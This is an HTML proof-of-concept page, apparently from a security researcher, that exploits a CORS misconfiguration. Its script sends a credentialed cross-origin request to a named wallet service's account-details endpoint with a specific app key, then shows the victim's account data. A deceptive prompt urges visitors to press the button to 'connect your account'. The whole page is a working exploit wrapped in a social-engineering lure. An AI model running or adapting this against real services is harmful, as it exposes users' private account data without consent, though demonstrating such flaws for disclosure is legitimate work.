<html>
     <body>
         <div id="demo">
            <h1>CORS PoC by Boogsta</h1>
            <h2>Please press below the button below to connect your accont to our service!</h2>
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://wallet.subsplash.com/ajax.php?do=account-details&appKey=M5BJMX", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
